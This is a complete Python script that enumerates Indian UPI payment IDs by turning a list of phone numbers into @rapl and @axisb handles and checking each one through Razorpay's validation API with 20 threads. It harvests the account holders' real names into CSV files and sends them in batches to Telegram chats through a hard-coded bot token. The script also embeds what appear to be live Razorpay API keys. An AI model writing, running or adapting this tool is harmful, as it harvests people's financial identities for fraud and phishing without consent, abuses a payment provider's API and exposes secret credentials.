import requests
import csv
import threading
import signal
import sys
import time
from requests.auth import HTTPBasicAuth
from concurrent.futures import ThreadPoolExecutor, as_completed

# Razorpay credentials
RAZORPAY_KEY_ID = 'rzp_live_T2dpQFbOcsErjG'
RAZORPAY_KEY_SECRET = 'sYYBmEQQ4bQbpnBKHKWj3bov'

# Telegram credentials (NEW)
TELEGRAM_BOT_TOKEN = "8700014917:AAHkOuyGUVSjw5267o-6D9KTPx-ppoFYH8Y"
TELEGRAM_CHAT_IDS = {
    "RBL Valid": "-1004466522979",
    "CRED Valid": "-1004407416043",
    "Both Valid": "-1004309394233"
}

# Rate limiter: max 10 requests per second
RATE_LIMIT = 10  # requests per second
_rate_semaphore = threading.Semaphore(RATE_LIMIT)

def _refill_tokens():
    """Refills the semaphore every second to allow RATE_LIMIT requests."""
    while True:
        time.sleep(1)
        for _ in range(RATE_LIMIT):
            try:
                _rate_semaphore.release()
            except ValueError:
                break  # semaphore already at max

_refill_thread = threading.Thread(target=_refill_tokens, daemon=True)
_refill_thread.start()

def rate_limited_post(url, **kwargs):
    """Wrapper around requests.post that enforces the global rate limit."""
    _rate_semaphore.acquire()
    return requests.post(url, **kwargs)

# Locks & counters
lock = threading.Lock()
checked = 0
RBL_valid_count = 0
cred_valid_count = 0
both_valid_count = 0

# Buffers and batch counters
RBL_buffer = []
cred_buffer = []
both_buffer = []
RBL_batch = 1
cred_batch = 1
both_batch = 1

# File names
RBL_FILE = "valid_RBL.csv"
CRED_FILE = "valid_cred.csv"
BOTH_FILE = "valid_both.csv"

# Initialize CSV files with headers
with open(RBL_FILE, "w", newline="") as f:
    writer = csv.DictWriter(f, fieldnames=["Number", "UPI", "Name"])
    writer.writeheader()

with open(CRED_FILE, "w", newline="") as f:
    writer = csv.DictWriter(f, fieldnames=["Number", "UPI", "Name"])
    writer.writeheader()

with open(BOTH_FILE, "w", newline="") as f:
    writer = csv.DictWriter(f, fieldnames=["Number", "UPI@rapl", "Name@rapl", "UPI@axisb", "Name@axisb"])
    writer.writeheader()

def save_result(filename, data, fields):
    with open(filename, "a", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=fields)
        writer.writerow(data)

def send_csv_to_telegram(filename, category):
    try:
        chat_id = TELEGRAM_CHAT_IDS.get(category)
        if not chat_id:
            print(f"⚠️ No chat ID found for {category}")
            return
        
        with open(filename, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument",
                data={"chat_id": chat_id, "caption": f"{category} batch results"},
                files={"document": f},
                timeout=10
            )
        print(f"📤 Sent {filename} to Telegram ({category})")
    except Exception as e:
        print(f"⚠️ Telegram file send error for {category}: {e}")

def flush_to_csv_and_telegram(buffer, category, batch_num, fields):
    if not buffer:
        return batch_num

    batch_filename = f"{category.lower().replace(' ', '_')}_batch_{batch_num}.csv"
    with open(batch_filename, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=fields)
        writer.writeheader()
        writer.writerows(buffer)

    send_csv_to_telegram(batch_filename, category)

    return batch_num + 1

def print_stats():
    print(f"📊 Stats | Checked: {checked} | ✅ RBL: {RBL_valid_count} | ✅ CRED: {cred_valid_count} | ✅ Both: {both_valid_count}", flush=True)

def validate_upi(upi_id):
    url = 'https://api.razorpay.com/v1/payments/validate/vpa'
    try:
        res = rate_limited_post(
            url,
            json={'vpa': upi_id},
            auth=HTTPBasicAuth(RAZORPAY_KEY_ID, RAZORPAY_KEY_SECRET),
            timeout=5
        )
        result = res.json()
        return upi_id, result.get('success', False), result.get('customer_name', '')
    except Exception as e:
        return upi_id, False, f"ERROR: {str(e)}"

def process_number(number):
    global checked, RBL_valid_count, cred_valid_count, both_valid_count
    global RBL_buffer, cred_buffer, both_buffer
    global RBL_batch, cred_batch, both_batch

    upi_RBL = number + "@rapl"
    upi_cred = number + "@axisb"

    _, valid_RBL, name_RBL = validate_upi(upi_RBL)
    _, valid_cred, name_cred = validate_upi(upi_cred)

    with lock:
        checked += 1

        if valid_RBL:
            RBL_valid_count += 1
            data = {"Number": number, "UPI": upi_RBL, "Name": name_RBL}
            save_result(RBL_FILE, data, ["Number", "UPI", "Name"])
            RBL_buffer.append(data)

            if len(RBL_buffer) >= 100:
                RBL_batch = flush_to_csv_and_telegram(RBL_buffer, "RBL Valid", RBL_batch, ["Number", "UPI", "Name"])
                RBL_buffer = []

        if valid_cred:
            cred_valid_count += 1
            data = {"Number": number, "UPI": upi_cred, "Name": name_cred}
            save_result(CRED_FILE, data, ["Number", "UPI", "Name"])
            cred_buffer.append(data)

            if len(cred_buffer) >= 100:
                cred_batch = flush_to_csv_and_telegram(cred_buffer, "CRED Valid", cred_batch, ["Number", "UPI", "Name"])
                cred_buffer = []

        if valid_RBL and valid_cred:
            both_valid_count += 1
            data = {
                "Number": number,
                "UPI@rapl": upi_RBL,
                "Name@rapl": name_RBL,
                "UPI@axisb": upi_cred,
                "Name@axisb": name_cred
            }
            save_result(BOTH_FILE, data, ["Number", "UPI@rapl", "Name@rapl", "UPI@axisb", "Name@axisb"])
            both_buffer.append(data)

            if len(both_buffer) >= 100:
                both_batch = flush_to_csv_and_telegram(both_buffer, "Both Valid", both_batch, ["Number", "UPI@rapl", "Name@rapl", "UPI@axisb", "Name@axisb"])
                both_buffer = []

        print(f"{upi_RBL} => {'✅ VALID' if valid_RBL else '❌ INVALID'}", flush=True)
        print(f"{upi_cred} => {'✅ VALID' if valid_cred else '❌ INVALID'}", flush=True)
        print_stats()

def signal_handler(sig, frame):
    print("\n⛔ Script interrupted. Flushing remaining results...")
    global RBL_batch, cred_batch, both_batch
    # Flush remaining buffers
    RBL_batch = flush_to_csv_and_telegram(RBL_buffer, "RBL Valid", RBL_batch, ["Number", "UPI", "Name"])
    cred_batch = flush_to_csv_and_telegram(cred_buffer, "CRED Valid", cred_batch, ["Number", "UPI", "Name"])
    both_batch = flush_to_csv_and_telegram(both_buffer, "Both Valid", both_batch, ["Number", "UPI@rapl", "Name@rapl", "UPI@axisb", "Name@axisb"])
    print_stats()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def main():
    try:
        with open("upis.txt") as f:
            numbers = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("❌ File 'upis.txt' not found.")
        return

    print(f"🔍 Checking {len(numbers)} numbers with threads...\n", flush=True)

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(process_number, number) for number in numbers]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"❌ Thread error: {e}", flush=True)

    # Final flush
    global RBL_batch, cred_batch, both_batch
    RBL_batch = flush_to_csv_and_telegram(RBL_buffer, "RBL Valid", RBL_batch, ["Number", "UPI", "Name"])
    cred_batch = flush_to_csv_and_telegram(cred_buffer, "CRED Valid", cred_batch, ["Number", "UPI", "Name"])
    both_batch = flush_to_csv_and_telegram(both_buffer, "Both Valid", both_batch, ["Number", "UPI@rapl", "Name@rapl", "UPI@axisb", "Name@axisb"])

    # Send final master CSVs
    send_csv_to_telegram(RBL_FILE, "RBL Valid")
    send_csv_to_telegram(CRED_FILE, "CRED Valid")
    send_csv_to_telegram(BOTH_FILE, "Both Valid")

    print("\n✅ Final Summary:")
    print(f" - {RBL_FILE} ({RBL_valid_count})")
    print(f" - {CRED_FILE} ({cred_valid_count})")
    print(f" - {BOTH_FILE} ({both_valid_count})")

if __name__ == '__main__':
    main()
